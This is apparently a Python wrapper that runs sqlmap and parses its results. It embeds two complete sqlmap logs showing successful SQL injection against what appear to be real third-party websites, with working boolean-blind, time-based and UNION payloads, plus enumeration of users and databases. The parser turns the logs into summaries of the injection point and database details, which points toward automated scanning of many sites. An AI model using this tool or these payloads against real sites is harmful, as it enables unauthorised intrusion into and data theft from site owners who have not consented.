# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import subprocess
import time
import os
import re

def writedata(x):
    with open('log.txt', 'a+')as aa:
        aa.write('***********************************' + '\n')
        aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + x + '\n')



def test001():
    comm = 'python sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1  -D security --tables --batch'
    # comm = 'python sqlmap.py -u http://127.0.0.1/sqli/Less-1/?id=1 --random-agent --dbs  --current-user --current-db --is-db --batch'
    print(comm)
    try:
        res = subprocess.Popen(comm, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        print(result)
        writedata(result)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
test001()
time.sleep(55555)


result = '''
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.2.11.6#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 13:39:20 /2019-05-02/

[13:39:21] [INFO] testing connection to the target URL
[13:39:21] [INFO] checking if the target is protected by some kind of WAF/IPS
[13:39:21] [INFO] testing if the target URL content is stable
[13:39:22] [INFO] target URL content is stable
[13:39:22] [INFO] testing if GET parameter 'id' is dynamic
[13:39:22] [INFO] GET parameter 'id' appears to be dynamic
[13:39:23] [WARNING] reflective value(s) found and filtering out
[13:39:23] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[13:39:23] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[13:39:23] [INFO] testing for SQL injection on GET parameter 'id'
[13:39:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:39:25] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="\u79df\u8f66\u6307\u5357_\u4e2d\u539f\u6c7d\u8f66\u7f51_\u4e2d\u539f\u6700\u4e13\u4e1a\u7684\u6c7d\u8f66\u8d44\u8baf\u7f51\u7ad9")
[13:39:26] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[13:39:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:39:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:39:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:39:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:39:28] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:39:28] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:39:28] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:39:29] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:39:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:39:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:39:30] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:39:30] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:39:30] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:39:30] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:39:31] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:39:31] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:39:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:39:31] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:39:31] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:39:31] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:39:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:39:31] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:39:31] [INFO] testing 'MySQL inline queries'
[13:39:31] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[13:39:31] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[13:39:31] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[13:39:32] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[13:39:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[13:39:32] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[13:39:32] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[13:40:37] [INFO] testing 'MySQL >= 5.0.12 OR time-based blind'
[13:41:38] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 OR time-based blind' injectable 
[13:41:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:41:38] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:41:38] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:41:39] [INFO] target URL appears to have 5 columns in query
[13:41:44] [INFO] target URL appears to be UNION injectable with 5 columns
[13:41:47] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
[13:41:47] [WARNING] automatically patching output having last char trimmed
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 86 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=49' AND 2376=2376 AND 'Ixlq'='Ixlq

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind
    Payload: id=49' OR SLEEP(5) AND 'XwMM'='XwMM

    Type: UNION query
    Title: Generic UNION query (NULL) - 5 columns
    Payload: id=49' UNION ALL SELECT CONCAT(0x716a6b6271,0x64586a69694346484675567574676c735a736d737264537044685a4d474c51455048734a57636c58,0x717a6b7071),NULL,NULL,NULL,NULL-- BwhA
---
[13:41:47] [INFO] the back-end DBMS is MySQL
web server operating system: Windows 2003 or XP
web application technology: ASP.NET, Microsoft IIS 6.0, PHP 5.2.17
back-end DBMS: MySQL >= 5.0.12
[13:41:47] [INFO] fetching current user
current user:    'zyauto@localhost'
[13:41:49] [INFO] fetching current database
current database:    'zyauto'
[13:41:49] [INFO] testing if current user is DBA
[13:41:49] [INFO] fetching current user
[13:41:49] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
current user is DBA:    False
[13:41:49] [INFO] fetching database users password hashes
[13:41:49] [WARNING] something went wrong with full UNION technique (could be because of limitation on retrieved number of entries). Falling back to partial UNION technique
[13:41:49] [WARNING] the SQL query provided does not return any output
[13:41:49] [INFO] fetching database users
[13:41:50] [INFO] fetching number of password hashes for user 'zyauto'
[13:41:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
[13:41:50] [INFO] retrieved: 
[13:41:50] [INFO] retrieved: 
[13:41:50] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 

[13:41:51] [WARNING] unable to retrieve the number of password hashes for user 'zyauto'
[13:41:51] [ERROR] unable to retrieve the password hashes for the database users (probably because the DBMS current user has no read privileges over the relevant system database table(s))
[13:41:51] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] zyauto

[13:41:51] [INFO] fetched data logged to text files under 'C:\\Users\langzi\.sqlmap\output\zhongyuanauto.com'

[*] ending @ 13:41:51 /2019-05-02/

'''


result = '''
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.11.6#dev}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:07:50 /2019-05-02/

[14:07:52] [INFO] testing connection to the target URL
[14:07:53] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:07:53] [WARNING] reflective value(s) found and filtering out
[14:07:53] [CRITICAL] heuristics detected that the target is protected by some kind of WAF/IPS
do you want sqlmap to try to detect backend WAF/IPS? [y/N] N
[14:07:53] [WARNING] dropping timeout to 10 seconds (i.e. '--timeout=10')
[14:07:53] [INFO] testing if the target URL content is stable
[14:07:54] [INFO] target URL content is stable
[14:07:54] [INFO] testing if GET parameter 'id' is dynamic
[14:07:54] [INFO] GET parameter 'id' appears to be dynamic
[14:07:54] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[14:07:54] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[14:07:54] [INFO] testing for SQL injection on GET parameter 'id'
[14:07:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:07:55] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="YUAN")
[14:07:56] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[14:07:57] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:07:57] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:07:57] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:07:57] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[14:07:57] [INFO] testing 'MySQL inline queries'
[14:07:57] [INFO] testing 'PostgreSQL inline queries'
[14:07:57] [INFO] testing 'Microsoft SQL Server/Sybase inline queries'
[14:07:57] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:07:58] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:07:58] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:07:58] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[14:07:58] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:07:58] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[14:07:58] [INFO] testing 'Oracle AND time-based blind'
[14:07:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:07:58] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:07:58] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:08:00] [INFO] target URL appears to have 42 columns in query
[14:08:00] [WARNING] applying generic concatenation (CONCAT)
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[14:08:33] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[14:08:35] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 407 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=588 AND 1949=1949
---
[14:08:37] [INFO] testing MySQL
[14:08:37] [WARNING] the back-end DBMS is not MySQL
[14:08:37] [INFO] testing Oracle
[14:08:37] [WARNING] the back-end DBMS is not Oracle
[14:08:37] [INFO] testing PostgreSQL
[14:08:37] [WARNING] the back-end DBMS is not PostgreSQL
[14:08:37] [INFO] testing Microsoft SQL Server
[14:08:37] [WARNING] the back-end DBMS is not Microsoft SQL Server
[14:08:37] [INFO] testing SQLite
[14:08:37] [INFO] confirming SQLite
[14:08:37] [INFO] actively fingerprinting SQLite
[14:08:38] [INFO] the back-end DBMS is SQLite
web server operating system: Windows 2008 R2 or 7
web application technology: Microsoft IIS 7.5, ASP.NET, PHP 5.3.8
back-end DBMS: SQLite
[14:08:38] [WARNING] on SQLite it is not possible to enumerate the current user
current user:	None
[14:08:38] [WARNING] on SQLite it is not possible to get name of the current database
current database:	None
[14:08:38] [WARNING] on SQLite the current user has all privileges
current user is DBA:	None
[14:08:38] [WARNING] on SQLite it is not possible to enumerate the user password hashes
[14:08:38] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
[14:08:38] [INFO] fetched data logged to text files under 'C:\\Users\langzi\.sqlmap\output\yuanchayuan.cn'

[*] ending @ 14:08:38 /2019-05-02/
'''
def check(content):
    if '---' in content:
        print('存在注入')
        return content






def get_result_from_test001(content):
    if check(content):
        # 注意，这里必须要用try做异常处理
        # 获取注入的参数和返回的数据库类型
        result_info = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', content, re.S)
        inj = result_info.group(1)
        dbs = result_info.group(2)
        print(inj.replace('Parameter: ','注入参数(方式) : ').replace('Type: ','注入方式 : ').replace('Title: ','注入标题 : ').replace('Payload: ','注入攻击 : ') + '\n')
        print('---------')
        print(dbs.replace('the back-end DBMS is ','数据库类型 : ').replace('web server operating system: ','服务器版本 : ').replace('web application technology: ','服务器语言 : ').replace('back-end DBMS: ','数据库版本 : ') + '\n')

        # 获取当前用户，当前数据库，是否为dba权限
        current_user_grep = re.search('(current user:.*?)\[',content,re.S)
        current_user = current_user_grep.group(1).replace('current user','当前用户')
        print(current_user)

        current_db_grep = re.search('(current database:.*?)\[',content,re.S)
        current_db = current_db_grep.group(1).replace('current database','当前数据库')
        print(current_db)

        is_dba_grep = re.search('(current user is DBA:.*?)\[',content,re.S)
        is_dba = is_dba_grep.group(1)
        print(is_dba.replace('current user is DBA','是否有DBA权限'))


        #获取所有的数据库
        all_dbs_grep = re.search('available databases.*?:(.*?)\[\d',content,re.S)
        print('所有数据库:{}'.format(all_dbs_grep.group(1)))

        #另外还存在两种情况  第一种是 access sqlite数据库只能用--tables 并且中途要设置爆破(修改sqlmap源码)
        #第二种是只能获取到当前数据库名，那么获取当前数据库名称后，获取表
        pass

get_result_from_test001(result)